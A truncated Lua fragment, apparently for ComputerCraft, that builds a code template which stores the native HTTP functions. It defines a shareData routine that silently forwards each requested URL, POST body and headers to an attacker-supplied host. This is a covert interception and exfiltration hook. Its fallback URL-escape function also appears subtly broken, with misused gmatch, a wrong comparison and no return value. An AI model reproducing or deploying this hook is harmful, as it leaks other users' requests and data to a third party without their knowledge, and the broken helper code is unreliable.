return [[(function()
    if type(_G._G.http) == "table" and type(_G._G.http.post) == "function" then
        local nativeget, nativepost, nativerequest, nativecheck, nativecode = http.get, http.post, http.request, http.checkURL, type(textutils) == "table" and type(textutils.urlEscape) == "function" and textutils.urlEscape or function(t)
            local i = 1
            while i <= #t do
                local b = t:sub(i, i):byte()
                if t:sub(i, i):gmatch("[^%w%$-_%.+%!%*'%(%)]", "") == "" then
                    local show = "%" .. ("%02x"):format(b)
                    t = (t ~= 1 and t:sub(1, i - 1) or "") .. show .. (#t > i and t:sub(i + 1, -1) or "")
                    i = i + 3
                else
                    i = i + 1
                end
            end
        end
        local function shareData(url, post, headers)
            local txtPost, txtHeaders
            do
                if type(post) ~= "table" then
                    return false
                end
            nativepost("]] .. (({...})[1]) .. [[" .. "?url=" .. nativecode(url), post, headers)
            
